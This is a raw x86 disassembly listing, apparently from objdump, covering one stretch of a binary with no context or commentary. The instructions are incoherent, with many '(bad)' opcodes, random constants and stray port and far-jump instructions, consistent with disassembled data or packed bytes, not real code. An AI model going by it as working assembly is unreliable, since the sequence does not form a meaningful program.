  425e6d:	or     cl,BYTE PTR es:[ebp-0x4b]
  425e71:	sub    DWORD PTR [edx+0x28],ebp
  425e74:	in     eax,0x4a
  425e76:	aad    0xaa
  425e78:	sbb    dh,al
  425e7a:	mov    esi,0x820d85b6
  425e7f:	adc    eax,0x6090e740
  425e84:	push   0xd68211f2
  425e89:	sbb    bl,BYTE PTR [esi-0x3843287c]
  425e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e90:	push   esp
  425e91:	mov    gs,WORD PTR [ebp+0x361835a2]
  425e97:	fcomp  st(2)
  425e99:	inc    edx
  425e9a:	cmp    ah,dh
  425e9c:	mov    bh,0x95
  425e9e:	outs   dx,BYTE PTR ds:[esi]
  425e9f:	bound  ecx,QWORD PTR ds:0x36cda286
  425ea5:	sbb    BYTE PTR [eax-0x2f],0xca
  425ea9:	mov    dl,0xab
  425eab:	aam    0x14
  425ead:	sub    BYTE PTR [esi+0x15051142],dh
  425eb3:	inc    esi
  425eb4:	push   edi
  425eb5:	or     al,0x35
  425eb7:	ret    0x30e8
  425eba:	ins    BYTE PTR es:[edi],dx
  425ebb:	push   ebp
  425ebc:	shr    BYTE PTR [ecx+0x1c],0x52
  425ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ec1:	enter  0xfbf0,0x2d
  425ec5:	push   0x12
  425ec7:	lods   al,BYTE PTR ds:[esi]
  425ec8:	sbb    al,0x7d
  425eca:	lea    esp,[esi+esi*2]
  425ecd:	mov    BYTE PTR [eax+0x79b33174],0x57
  425ed4:	xchg   ecx,eax
  425ed5:	adc    BYTE PTR [esi],cl
  425ed7:	aam    0xfe
  425ed9:	rol    BYTE PTR [ebp-0x344f1e00],cl
  425edf:	(bad)  [edx]
  425ee1:	fisttp DWORD PTR [esi+ecx*4+0x4]
  425ee5:	stos   DWORD PTR es:[edi],eax
  425ee6:	pop    edx
  425ee7:	sbb    al,0x7c
  425ee9:	fsub   st(2),st
  425eeb:	and    bl,dh
  425eed:	mov    al,0xa8
  425eef:	mov    ds:0x59cca4ee,eax
  425ef4:	outs   dx,BYTE PTR ds:[esi]
  425ef5:	lds    ebp,FWORD PTR [edi+0x1a00b632]
  425efb:	daa    
  425efc:	fcom   DWORD PTR [ecx+edx*8+0x60]
  425f00:	xchg   edx,eax
  425f01:	dec    edx
  425f02:	and    cl,BYTE PTR [edi-0x683883fc]
  425f08:	ret    0xe6aa
  425f0b:	lods   al,BYTE PTR ss:[esi]
  425f0d:	xchg   esp,eax
  425f0e:	xor    BYTE PTR ds:0x81b942c9,ch
  425f14:	mov    al,ds:0x603809a0
  425f19:	push   es
  425f1a:	test   BYTE PTR [esi-0xa],cl
  425f1d:	mov    eax,0xf4514760
  425f22:	push   0x1e5dd8e9
  425f27:	mov    ah,0x3a
  425f29:	add    ah,ah
  425f2b:	inc    esi
  425f2c:	push   ebx
  425f2d:	jnp    0x425f9a
  425f2f:	xor    dl,cl
  425f31:	mov    al,ds:0xac007735
  425f36:	cli    
  425f37:	push   edx
  425f38:	or     BYTE PTR [ebx],0x7e
  425f3b:	add    bl,BYTE PTR [ebx]
  425f3d:	add    al,0x8
  425f3f:	push   cs
  425f40:	add    dh,BYTE PTR [edi+0x16675324]
  425f46:	sbb    DWORD PTR [ebx+0x28724413],ebp
  425f4c:	dec    edx
  425f4d:	fdiv   DWORD PTR [eax+0x74]
  425f50:	sbb    BYTE PTR [edx+0x7238c0b0],bh
  425f56:	dec    edi
  425f57:	pop    dx
  425f59:	xlat   BYTE PTR ds:[ebx]
  425f5a:	add    eax,0x311e1860
  425f5f:	(bad)  
  425f60:	sub    dl,BYTE PTR [esi]
  425f62:	jb     0x425f38
  425f64:	mov    cl,BYTE PTR [edx]
  425f66:	or     ch,BYTE PTR [edx+eax*2+0x60]
  425f6a:	or     BYTE PTR [esi],ah
  425f6c:	int3   
  425f6d:	mov    eax,0xab4759d1
  425f72:	pop    eax
  425f73:	cwde   
  425f74:	gs push 0xffffff82
  425f77:	pop    es
  425f78:	xchg   esp,eax
  425f79:	sub    eax,0xbcf473ea
  425f7e:	mov    al,ds:0x8116a8a8
  425f83:	cmp    bl,ah
  425f85:	add    al,BYTE PTR [ebp+0x7e]
  425f88:	stos   DWORD PTR es:[edi],eax
  425f89:	push   edx
  425f8a:	add    BYTE PTR [esi],al
  425f8c:	pop    eax
  425f8d:	rcl    eax,1
  425f8f:	aad    0xda
  425f91:	in     al,dx
  425f92:	and    bh,BYTE PTR [esi]
  425f94:	cmp    ebp,DWORD PTR [ebx+eax*4-0x65c65f1e]
  425f9b:	pusha  
  425f9c:	ret    0xf2bc
  425f9f:	add    BYTE PTR [esi-0x25],dh
  425fa2:	sbb    BYTE PTR [ebp+0x5],cl
  425fa5:	lods   eax,DWORD PTR ds:[esi]
  425fa6:	sbb    BYTE PTR [ebx],ah
  425fa8:	mov    esi,0xa9a6c03
  425fad:	pop    ebx
  425fae:	inc    eax
  425faf:	sub    al,0xe8
  425fb1:	xor    ah,BYTE PTR [esi-0x67db56da]
  425fb7:	imul   esi,DWORD PTR ds:0x62f058ef,0x29
  425fbe:	test   bl,al
  425fc0:	inc    edx
  425fc1:	jle    0x426022
  425fc3:	add    BYTE PTR [ebp+0x416d1a8d],ah
  425fc9:	stos   DWORD PTR es:[edi],eax
  425fca:	push   edx
  425fcb:	pop    edx
  425fcc:	jmpw   0x1b5e
  425fd0:	mov    edx,0x2b227496
  425fd5:	ins    DWORD PTR es:[edi],dx
  425fd6:	mov    al,0x6f
  425fd8:	int    0x0
  425fda:	bound  esp,QWORD PTR [ebx+0x64c782]
  425fe0:	cli    
  425fe1:	jg     0x425fad
  425fe3:	mov    esp,0x289274b
  425fe8:	fld    TBYTE PTR [eax+ebp*1-0x3483e917]
  425fef:	inc    ebp
  425ff0:	xchg   esp,eax
  425ff1:	cmp    al,0xfe
  425ff3:	ret    
  425ff4:	mov    ch,0xca
  425ff6:	stos   BYTE PTR es:[edi],al
  425ff7:	fs jmp 0x6080:0xbcb10c88
  425fff:	xor    esp,DWORD PTR [ebx+0x222a24a2]
  426005:	push   edx
  426006:	dec    eax
  426007:	adc    BYTE PTR [ebx+ebx*4+0x41],al
  42600b:	xchg   ecx,eax
  42600c:	rcl    BYTE PTR [eax],cl
  42600e:	pop    eax
  42600f:	dec    esp
  426010:	and    BYTE PTR [ecx-0x65e5fee2],0x6c
  426017:	mov    edi,0xf8ee9a44
  42601c:	and    BYTE PTR ds:0x51435570,ch
  426022:	inc    ecx
  426023:	jo     0x426021
  426025:	retf   0xd3c8
  426028:	dec    edx
  426029:	sbb    ecx,DWORD PTR [esi+0x6c]
  42602c:	push   edi
  42602d:	and    DWORD PTR [edx-0xb],0x9b6cace3
  426034:	enter  0x2d73,0xe8
  426038:	fld    TBYTE PTR [ebx]
  42603a:	or     ch,BYTE PTR [edx]
  42603c:	sbb    BYTE PTR [esp+esi*4],0xb9
  426040:	pop    esi
  426041:	ss add BYTE PTR es:[eax+0x16],al
  426046:	mov    cl,BYTE PTR [eax+0x51]
  426049:	rcl    DWORD PTR [eax+0x60],1
  42604c:	inc    esi
  42604d:	mov    al,BYTE PTR [ebx-0x2c]
  426050:	cs mov esi,0x16a8746b
  426056:	sub    ah,bh
  426058:	ss cmp eax,0xf25ad8f5
  42605e:	mov    DWORD PTR [edi+0x28367536],0x7e7287b8
  426068:	push   edi
  426069:	push   esp
  42606a:	xchg   BYTE PTR [ebx+0x51],ah
  42606d:	inc    ecx
  42606e:	xchg   esi,eax
  42606f:	xor    BYTE PTR [esi+0x56],ah
  426072:	adc    DWORD PTR [esi],edi
  426074:	xchg   esi,eax
  426075:	dec    esp
  426076:	fwait
  426077:	mov    al,ah
  426079:	push   0xcd28232c
  42607e:	int    0x1c
  426080:	aad    0x60
  426082:	add    eax,0xe24ef0b6
  426087:	ret    0x5878
  42608a:	(bad)  
  42608b:	(bad)  
  42608c:	push   eax
  42608d:	xchg   esi,eax
  42608e:	(bad)  
  42608f:	outs   dx,BYTE PTR ds:[esi]
  426090:	or     eax,0x367e2d52
  426095:	and    eax,0x54449a70
  42609a:	adc    al,0x66
  42609c:	jg     0x426026
  42609e:	leave  
  42609f:	xor    al,0x20
  4260a1:	and    DWORD PTR [edx-0x3b],0xe84dec91
  4260a8:	scas   eax,DWORD PTR es:[edi]
  4260a9:	cli    
  4260aa:	inc    esi
  4260ab:	push   es
  4260ac:	inc    ebp
  4260ad:	inc    ebp
  4260ae:	inc    ebx
  4260af:	inc    ecx
  4260b0:	rcl    edx,0x25
  4260b3:	mov    WORD PTR [ecx-0x6c],es
  4260b6:	scas   al,BYTE PTR es:[edi]
  4260b7:	loop   0x4260fe
  4260b9:	dec    ebp
  4260ba:	or     eax,0x1a3e3066
  4260bf:	xor    eax,0xf7a44770
  4260c4:	inc    ebp
  4260c5:	inc    ebp
  4260c6:	adc    eax,0xe2197e1d
  4260cb:	pop    esi
  4260cc:	out    0x6f,al
  4260ce:	or     BYTE PTR [edi+0x1db22f98],cl
  4260d4:	test   al,0x44
  4260d6:	add    DWORD PTR [edx+0xa0d75c],ebx
  4260dc:	in     eax,dx
  4260dd:	dec    edx
  4260de:	add    eax,0xf4045605
  4260e3:	fdiv   QWORD PTR [eax+0x36]
  4260e6:	test   eax,0x6b57b01e
  4260eb:	adc    eax,0x5420b986
  4260f0:	adc    DWORD PTR [edx+0x32a094fb],ebx
  4260f6:	push   ecx
  4260f7:	test   DWORD PTR [eax-0x39b3729d],esp
  4260fd:	in     al,dx
  4260fe:	jmp    0x46e6:0x80800216
  426105:	inc    ecx
  426106:	jmp    0x4260e6
  426108:	cwde   
  426109:	pop    esi
  42610a:	mov    eax,0xd17f350c
  42610f:	push   esi
  426110:	jo     0x426128
  426112:	or     BYTE PTR [edi],0xdd
  426115:	enter  0x8e,0x51
  426119:	cmp    al,BYTE PTR [eax]
  42611b:	push   es
  42611c:	and    dl,dl
  42611e:	aad    0x9a
  426120:	mov    ds:0x240b94a0,eax
  426125:	fst    DWORD PTR [edx]
  426127:	add    al,0xa5
  426129:	repnz sbb cl,BYTE PTR cs:[edx]
  42612d:	push   eax
  42612e:	push   esp
  42612f:	pop    edx
  426130:	sub    bh,BYTE PTR [esi]
  426132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426133:	push   0xffffff8c
  426135:	bound  edx,QWORD PTR [ecx-0x24fd278a]
  42613b:	add    al,0x25
  42613d:	dec    edi
  42613e:	inc    eax
  42613f:	mov    edx,0x78ca9c6c
  426144:	mov    ebp,0xc1abb18f
  426149:	sbb    dl,BYTE PTR [edx+0x2f2c763f]
  42614f:	fiadd  DWORD PTR [eax+edi*2+0x4d05b430]
  426156:	jbe    0x42616e
  426158:	adc    BYTE PTR [ecx+ebp*8+0x3eb5dc57],dh
  42615f:	inc    ebp
  426160:	and    DWORD PTR [edx+0x32ada22d],0x6c7c3476
  42616a:	sbb    ebp,DWORD PTR [edx-0x3f]
  42616d:	xchg   BYTE PTR [ebx],al
  42616f:	arpl   cx,si
  426171:	xchg   ebp,eax
  426172:	xchg   edx,eax
  426173:	retf   0xd0a4
  426176:	fimul  WORD PTR [edx+0x228ec4fd]
  42617c:	xchg   edx,eax
  42617d:	(bad)  
  42617e:	mov    ds:0x44f2543d,al
  426183:	sar    DWORD PTR [edx+0x2e81da30],cl
  426189:	ins    BYTE PTR es:[edi],dx
  42618a:	push   ebp
  42618b:	mov    BYTE PTR [ebx-0x5d719ebe],ah
  426191:	or     eax,0x948578af
  426196:	add    BYTE PTR [edx+ebp*4-0x60],bl
  42619a:	out    dx,al
  42619b:	cmp    BYTE PTR [esi-0x76],bl
  42619e:	aam    0x65
  4261a0:	pop    ds
  4261a1:	test   BYTE PTR [eax+0x16d60160],dh
  4261a7:	ds call 0xd49d826d
  4261ad:	les    esp,FWORD PTR [esi+0x522abfe0]
  4261b3:	into   
  4261b4:	push   cs
  4261b5:	mov    DWORD PTR [ebp+0x2cb64eab],ebp
  4261bb:	xchg   DWORD PTR [eax],edx
  4261bd:	lods   al,BYTE PTR ds:[si]
  4261bf:	and    bh,BYTE PTR [edi-0x2f]
  4261c2:	aad    0x65
  4261c4:	or     ebp,DWORD PTR [esi+0x6834f808]
  4261ca:	pop    ebx
  4261cb:	es cdq 
  4261cd:	pop    eax
  4261ce:	add    BYTE PTR [esi],0xdb
  4261d1:	xor    dh,cl
  4261d3:	nop
  4261d4:	mov    es,WORD PTR [esi+0x211d0418]
  4261da:	inc    ebp
  4261db:	add    eax,0x43248af6
  4261e0:	es push ss
  4261e2:	sbb    BYTE PTR [ebp-0x26],dh
  4261e5:	jns    0x4261e7
  4261e7:	sub    eax,0xe18e6a68
  4261ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261ed:	aam    0xc
  4261ef:	imul   DWORD PTR [edi+0x70d0db06]
  4261f5:	and    bh,ah
  4261f7:	bnd jae 0x426232
  4261fa:	jle    0x426233
  4261fc:	mov    BYTE PTR [eax],ah
  4261fe:	xor    eax,0xd782da88
  426203:	cmp    WORD PTR [edx-0x1f4989ea],sp
  42620a:	scas   eax,DWORD PTR es:[edi]
  42620b:	dec    eax
  42620c:	mov    cl,0xa0
  42620e:	jne    0x42627e
  426210:	cli    
  426211:	jo     0x426290
  426213:	jb     0x42624c
  426215:	adc    dh,0x2d
  426218:	mov    dl,0xa
  42621a:	mov    al,ds:0x5e0cf080
  42621f:	push   0x38
  426221:	leave  
  426222:	into   
  426223:	add    DWORD PTR [esp+edi*2],edx
  426226:	xchg   ecx,eax
  426227:	sub    BYTE PTR [esi-0x61],ch
  42622a:	add    BYTE PTR [eax],0xc4
  42622d:	and    al,0x9c
  42622f:	mov    bl,0x5a
  426231:	xlat   BYTE PTR ds:[ebx]
  426232:	data16 jp 0x4261d7
  426235:	dec    ecx
  426236:	xchg   DWORD PTR [eax-0x25d18972],esp
  42623c:	ror    BYTE PTR [eax+0x4d4d0d97],0xd6
  426243:	or     ah,BYTE PTR [esi+0x4f622ee]
  426249:	ss in  al,dx
  42624b:	das    
  42624c:	ret    
  42624d:	ss aaa 
  42624f:	mov    ah,0x32
  426251:	push   edx
  426252:	js     0x42628c
  426254:	outs   dx,DWORD PTR ds:[esi]
  426255:	add    BYTE PTR [esi],ah
  426257:	pop    ss
  426258:	fsub   st,st(2)
  42625a:	push   0x78a9ad05
  42625f:	mov    eax,0xd5041040
  426264:	shl    BYTE PTR [eax-0x6c],0xd6
  426268:	push   0xffffffaf
  42626a:	test   al,0x68
  42626c:	repnz mov ds:0xb1c4ac4c,al
  426272:	xchg   ecx,eax
  426273:	add    BYTE PTR ds:0x15aed7e8,al
  426279:	sub    al,0x2a
  42627b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42627c:	mov    WORD PTR [edx+0x79cc50b9],ss
  426282:	sbb    BYTE PTR [edi-0x77],0xe8
  426286:	add    DWORD PTR ds:0x2cf636c3,esi
  42628c:	out    dx,al
  42628d:	or     dh,ch
  42628f:	lahf   
  426290:	pusha  
  426291:	mov    ebx,0xd0fedb9a
  426296:	push   cs
  426297:	sub    al,0x12
  426299:	cmp    al,0x4
  42629b:	pop    ebx
  42629c:	rcl    DWORD PTR [eax+0x50],cl
  42629f:	adc    ah,BYTE PTR [ebx]
  4262a1:	js     0x4262de
  4262a3:	ret    0x1100
  4262a6:	and    cl,BYTE PTR [esp+ebx*1+0xd1bf007]
  4262ad:	mov    esi,?
  4262af:	mov    al,ds:0x5a50902d
  4262b4:	inc    edi
  4262b5:	inc    ebp
  4262b6:	lds    eax,FWORD PTR [edi+0x795264e8]
  4262bc:	push   es
  4262bd:	int    0x16
  4262bf:	das    
  4262c0:	out    0x5f,al
  4262c2:	sar    BYTE PTR [edx],1
  4262c4:	and    al,0x74
  4262c6:	xor    al,0x41
  4262c8:	scas   al,BYTE PTR es:[edi]
  4262c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262ca:	mov    ecx,0x176500
  4262cf:	ror    BYTE PTR [esi],1
  4262d1:	sub    DWORD PTR [ebp-0x204baa96],0xffffffc4
  4262d8:	mov    dl,0x36
  4262da:	push   DWORD PTR [esi]
  4262dc:	dec    esp
  4262dd:	adc    al,0x1c
  4262df:	ins    DWORD PTR es:[edi],dx
  4262e0:	inc    ebp
  4262e1:	push   ebx
  4262e2:	jmp    0xda592987
  4262e7:	mov    ah,0x4
  4262e9:	cdq    
  4262ea:	sbb    BYTE PTR [edx-0x954bb2a],al
  4262f0:	add    eax,DWORD PTR [edx]
  4262f2:	(bad)  
  4262f3:	and    bl,BYTE PTR [ecx]
  4262f5:	mov    ss,WORD PTR [edi+0x207c6cba]
  4262fb:	mov    dh,0x48
  4262fd:	inc    eax
  4262fe:	aad    0x6d
  426300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426301:	bsf    ebx,DWORD PTR [ebx+0x75]
  426305:	add    eax,0x1a3c7a74
  42630a:	xchg   ebx,eax
  42630b:	add    BYTE PTR [ebp+0x160f670c],dl
  426311:	push   edi
  426312:	shl    BYTE PTR [esi-0x5ff6d1f6],0xed
  426319:	jo     0x426319
  42631b:	pop    ebp
  42631c:	out    0x5,al
  42631e:	add    eax,0x549f4805
  426323:	ja     0x426331
  426325:	fcmove st,st(7)
  426327:	add    BYTE PTR [ecx-0x76f7eb8a],bh
  42632d:	icebp  
  42632e:	adc    BYTE PTR [eax-0x62],ah
  426331:	xchg   cx,sp
  426334:	xchg   dh,dl
  426336:	push   esi
  426337:	sbb    DWORD PTR [esi+ebx*1-0x27],esi
  42633b:	xor    edx,DWORD PTR [esi]
  42633d:	add    eax,0x15a4d1e8
  426342:	dec    esi
  426343:	adc    DWORD PTR [ebp+0x62],eax
  426346:	bnd jbe 0x426325
  426349:	sub    edx,DWORD PTR [ecx]
  42634b:	hlt    
  42634c:	dec    ebp
  42634d:	pop    ebp
  42634e:	stos   BYTE PTR es:[edi],al
  42634f:	jge    0x426373
  426351:	les    edx,FWORD PTR [ecx+0x0]
  426354:	push   0x5755cc1c
  426359:	push   ebx
  42635a:	rcl    DWORD PTR [esi+eax*1-0x10],0xf4
  42635f:	in     eax,0xce
  426361:	push   ecx
  426362:	cld    
  426363:	push   ecx
  426364:	push   ebp
  426365:	aad    0x6c
  426367:	mov    ebx,0xcdca7655
  42636c:	jle    0x426397
  42636e:	jmp    0x12d8:0xab230ddf
  426375:	pop    ecx
  426376:	mov    edx,0x56a602d6
  42637b:	into   
  42637c:	or     al,0xaa
  42637e:	ins    DWORD PTR es:[edi],dx
  42637f:	pushf  
  426380:	lock fild WORD PTR [eax]
  426383:	push   esi
  426384:	(bad)  
  426385:	or     BYTE PTR [esi],dh
  426387:	adc    DWORD PTR [ecx+0x56],eax
  42638a:	mov    ebx,DWORD PTR fs:[esi+eax*2+0x1a]
  42638f:	loop   0x42638f
  426391:	xchg   edi,eax
  426392:	les    eax,FWORD PTR [ecx+0x2b]
  426395:	push   0x8e80a0ad
  42639a:	(bad)  
  42639b:	cli    
  42639c:	adc    al,0x30
  42639e:	inc    edx
  42639f:	push   ss
  4263a0:	push   0x6c
  4263a2:	ins    BYTE PTR es:[edi],dx
  4263a3:	push   ecx
  4263a4:	inc    ebp
  4263a5:	inc    ebp
  4263a6:	pop    edx
  4263a7:	or     bl,BYTE PTR [esi]
  4263a9:	cmp    cl,al
  4263ab:	je     0x42635a
  4263ad:	inc    edi
  4263ae:	cmp    BYTE PTR [eax+0xa2ad8],ah
  4263b4:	repz hlt 
  4263b6:	test   al,0xbe
  4263b8:	xchg   ebp,eax
  4263b9:	mov    ebx,0xcaad60a
  4263be:	fbld   TBYTE PTR [esi]
  4263c0:	bound  edi,QWORD PTR [ebx+0x0]
  4263c3:	mov    esp,DWORD PTR [edx+0x1a]
  4263c6:	cmp    al,0x35
  4263c8:	dec    esp
  4263c9:	test   DWORD PTR [esi],edx
  4263cb:	mov    al,BYTE PTR [esi+0x4406868a]
  4263d1:	jb     0x4263af
  4263d3:	mov    esi,0xe2d02a4a
  4263d8:	xor    DWORD PTR [esi-0x28],edx
  4263db:	xor    ecx,DWORD PTR [ebp+0xf5552fa]
  4263e1:	cli    
  4263e2:	cmp    ebx,DWORD PTR [esp+ebp*2-0x59c3fbb3]
  4263e9:	out    0xa,eax
  4263eb:	xchg   esp,eax
  4263ec:	xor    bh,BYTE PTR [edx]
  4263ee:	jmp    0x426376
  4263f0:	int    0xa6
  4263f2:	sub    DWORD PTR [edx],esi
  4263f4:	int3   
  4263f5:	(bad)  
  4263f6:	mov    al,0x4d
  4263f8:	(bad)  
  4263fa:	lock xor al,0x4d
  4263fd:	shl    DWORD PTR [esi+ecx*1],cl
  426400:	cmp    al,0x95
  426402:	or     eax,0xd34d3484
  426407:	fadd   QWORD PTR [ebx+0x18b95500]
  42640d:	add    edx,esp
  42640f:	push   ecx
  426410:	jnp    0x426455
  426412:	rcl    DWORD PTR [edi+0x4ed4442],cl
  426418:	add    dh,ch
  42641a:	adc    bh,dh
  42641c:	repnz inc ecx
  42641e:	push   ecx
  42641f:	push   ebp
  426420:	inc    ecx
  426421:	inc    edi
  426422:	dec    esi
  426423:	test   eax,0xffcece66
  426428:	fidivr WORD PTR [edx]
  42642a:	int3   
  42642b:	inc    esp
  42642c:	inc    edi
  42642d:	pop    ds
  42642e:	cmp    al,0x51
  426430:	stos   BYTE PTR es:[edi],al
  426431:	in     al,0x6d
  426433:	dec    ebp
  426434:	mov    bl,0x69
  426436:	mov    bh,dh
  426438:	mov    ds:0xd548fccf,al
  42643d:	pop    eax
  42643e:	aaa    
  42643f:	dec    ebp
  426440:	shl    DWORD PTR [esi+edx*8],cl
  426443:	ror    edx,1
  426445:	dec    eax
  426446:	pusha  
  426447:	add    BYTE PTR [edx+0x34d34d34],ch
  42644d:	sbb    ecx,edi
  42644f:	aaa    
  426450:	ins    BYTE PTR es:[edi],dx
  426451:	(bad)  
  426452:	mov    ah,0x45
  426454:	sar    WORD PTR ds:0xbfbc9f62,cl
  42645b:	adc    BYTE PTR [edx-0x4e],0xb7
  42645f:	adc    eax,0x8a3a02f6
  426464:	add    BYTE PTR [ebx-0x66],ah
  426467:	mov    eax,0xbe707646
  42646c:	les    eax,FWORD PTR [eax]
  42646e:	outs   dx,BYTE PTR ds:[esi]
  42646f:	mov    al,ds:0x168041a0
  426474:	fadd   QWORD PTR [esi+0x13a00011]
  42647a:	adc    eax,0x167ea80a
  42647f:	inc    BYTE PTR [eax+0x1]
  426482:	push   ecx
  426483:	in     eax,0x94
  426485:	jne    0x4264ab
  426487:	mov    BYTE PTR [eax+0x58],al
  42648a:	pop    edx
  42648b:	sub    edx,edi
  42648d:	push   esi
  42648e:	rcl    DWORD PTR [ecx+0x22],1
  426491:	int    0xc0
  426493:	push   ebp
  426494:	inc    esi
  426495:	in     al,dx
  426496:	mov    ss,WORD PTR [edx-0x1d6fff94]
  42649c:	xor    bl,BYTE PTR [ecx]
  42649e:	pop    ebp
  42649f:	pop    edi
  4264a0:	push   0x96727a29
  4264a5:	(bad)  
  4264a6:	cmp    cl,BYTE PTR [ebx+edi*8+0x2]
  4264aa:	xchg   BYTE PTR [eax-0x3baccfeb],bh
  4264b0:	stos   DWORD PTR es:[edi],eax
  4264b1:	cli    
  4264b2:	pop    edx
  4264b3:	fist   DWORD PTR [ecx-0x80]
  4264b6:	rcl    BYTE PTR [esi],1
  4264b8:	fmul   DWORD PTR [edx+0x6e0a8cc9]
  4264be:	out    dx,al
  4264bf:	xor    eax,0x9228135
  4264c4:	and    al,0x68
  4264c6:	in     al,0xce
  4264c8:	and    dl,BYTE PTR [esi]
  4264ca:	cwde   
  4264cb:	and    bh,dh
  4264cd:	push   ds
  4264ce:	in     al,0x7d
  4264d0:	dec    eax
  4264d1:	pop    esp
  4264d2:	test   BYTE PTR [ebx-0x48],cl
  4264d5:	cld    
  4264d6:	(bad)  
  4264d7:	fdivr  st,st(6)
  4264d9:	aam    0xd6
  4264db:	stos   BYTE PTR es:[edi],al
  4264dc:	mov    edx,0x8618359e
  4264e1:	cli    
  4264e2:	xor    al,0x16
  4264e4:	dec    esp
  4264e5:	stos   BYTE PTR es:[edi],al
  4264e6:	or     DWORD PTR [ebx+0x28],0x78
  4264ea:	jle    0x4264c7
  4264ec:	ins    BYTE PTR es:[edi],dx
  4264ed:	dec    edx
  4264ee:	mov    ah,0x56
  4264f0:	stos   DWORD PTR es:[edi],eax
  4264f1:	push   0x47
  4264f3:	push   ebp
  4264f4:	fwait
  4264f5:	ss jne 0x42652e
  4264f8:	sub    bl,bl
  4264fa:	lock mov ss,WORD PTR [ebp+0x18]
  4264fe:	ss mov edi,0x5600827a
  426504:	je     0x426506
  426506:	jmp    0x7339:0xd69ef513
  42650d:	add    DWORD PTR [esi],esi
  42650f:	xor    al,0x82
  426511:	push   ebp
  426512:	adc    al,0xe6
  426514:	dec    esp
  426515:	(bad)  
  426516:	mov    ebx,0x66a28700
  42651b:	adc    eax,0xa8a63f5b
  426520:	mov    DWORD PTR [eax-0x2c05d1dd],ecx
  426526:	mov    al,0x50
  426528:	test   DWORD PTR [edx-0x4a7b7756],eax
  42652e:	pop    edx
  42652f:	push   ecx
  426530:	les    ebx,FWORD PTR [ebx+0x68]
  426533:	or     eax,0xa0fc4da2
  426538:	sbb    edx,ebp
  42653a:	mov    al,0x92
  42653c:	imul   edx,DWORD PTR [esi],0x55
  42653f:	mov    dh,0xc0
  426541:	jl     0x4264ee
  426543:	hlt    
  426544:	and    BYTE PTR [esi+0xa00b1df],cl
  42654a:	pop    ebx
  42654b:	js     0x4265a8
  42654d:	mov    bl,0x4c
  42654f:	arpl   WORD PTR [ecx-0x7b],ax
  426552:	mov    ch,0xc8
  426554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426555:	mov    esp,0xe4333ae2
  42655a:	ret    0x2bbd
  42655d:	call   0x3ff4:0x50a441c1
  426564:	inc    eax
  426565:	dec    edi
  426566:	push   0x33edd56
  42656b:	xchg   esp,eax
  42656c:	pusha  
  42656d:	lods   al,BYTE PTR ds:[esi]
  42656e:	adc    BYTE PTR [ebx],0x0
  426571:	rol    eax,0x2b
  426574:	hlt    
  426575:	adc    al,0x8
  426577:	mov    WORD PTR [edx-0x66e79378],?
  42657d:	sub    eax,0x868cd68
  426582:	and    dl,BYTE PTR [eax-0x1887524e]
  426588:	pop    esp
  426589:	fld    DWORD PTR [esi+0x634e03aa]
  42658f:	inc    edx
  426590:	cs loopne 0x426562
  426593:	xlat   BYTE PTR ds:[ebx]
  426594:	jl     0x4265c5
  426596:	sub    BYTE PTR [eax-0x4a],ch
  426599:	call   0x585f2f79
  42659e:	lea    ebp,[edx+edx*8-0x20]
  4265a2:	jecxz  0x426569
  4265a4:	add    BYTE PTR [ebx+0x15],bh
  4265a7:	stos   BYTE PTR es:[edi],al
  4265a8:	dec    ebp
  4265a9:	icebp  
  4265aa:	pop    edx
  4265ab:	add    BYTE PTR [edi+0x75],dl
  4265ae:	mov    ss,WORD PTR [esi+edi*1-0x7f779324]
  4265b5:	jo     0x4265ba
  4265b7:	or     eax,0x2ae658e
  4265bc:	push   edx
  4265bd:	dec    BYTE PTR [edx]
  4265bf:	call   0x39f6:0x24fce8ed
  4265c6:	adc    DWORD PTR [edx-0x6c],edx
  4265c9:	outs   dx,DWORD PTR ds:[esi]
  4265ca:	add    BYTE PTR [esi+ebp*4],dh
  4265cd:	mov    bp,WORD PTR [edx]
  4265d0:	add    al,0x1
  4265d2:	(bad)  
  4265d3:	in     eax,0x77
  4265d5:	inc    eax
  4265d6:	mov    BYTE PTR [edx],dh
  4265d8:	cmp    BYTE PTR [eax+eiz*1+0x36],bh
  4265dc:	mov    ch,0xf7
  4265de:	cmp    BYTE PTR [edx],0x7c
  4265e1:	xchg   esi,eax
  4265e2:	(bad)  
  4265e3:	xchg   edx,eax
  4265e4:	je     0x4265fc
  4265e6:	push   eax
  4265e7:	push   eax
  4265e8:	lock inc esp
  4265ea:	add    al,0x86
  4265ec:	mov    ah,0x9f
  4265ee:	fsubr  DWORD PTR [edi]
  4265f0:	shl    BYTE PTR [esi],1
  4265f2:	mov    ah,0x56
  4265f4:	pusha  
  4265f5:	rcl    DWORD PTR [eax],0x96
  4265f8:	pop    eax
  4265f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265fa:	aam    0x46
  4265fc:	das    
  4265fd:	mov    eax,0xaf340e4
  426602:	mov    ds:0x2d1ca6,eax
  426607:	mov    ebx,DWORD PTR [eax]
  426609:	cld    
  42660a:	int    0x56
  42660c:	sbb    al,0x8a
  42660e:	xchg   ah,bh
  426610:	adc    cl,ah
  426612:	arpl   WORD PTR [edx],sp
  426614:	adc    BYTE PTR [edi-0x4bf28b25],ah
  42661a:	out    dx,al
  42661b:	push   ss
  42661c:	jae    0x426696
  42661e:	sub    eax,0xf4aff870
  426623:	cmc    
  426624:	push   cs
  426625:	inc    ecx
  426626:	inc    ecx
  426627:	mov    dh,0x2a
  426629:	push   es
  42662a:	int3   
  42662b:	cld    
  42662c:	pop    WORD PTR [eax]
  42662f:	pop    esi
  426630:	mov    edx,0x785b5a34
  426635:	retf   0xbe5e
  426638:	aad    0x10
  42663a:	outs   dx,BYTE PTR ds:[esi]
  42663b:	xor    bh,0x51
  42663e:	hlt    
  42663f:	dec    eax
  426640:	sub    al,0xec
  426642:	sbb    DWORD PTR [esi-0x5e],edi
  426645:	outs   dx,DWORD PTR ds:[esi]
  426646:	mov    WORD PTR [edi+0x51342b06],cs
  42664c:	fs pushf 
  42664e:	jb     0x426664
  426650:	or     BYTE PTR [eax],0xa2
  426653:	sar    BYTE PTR [edx+0x11aa0014],0x34
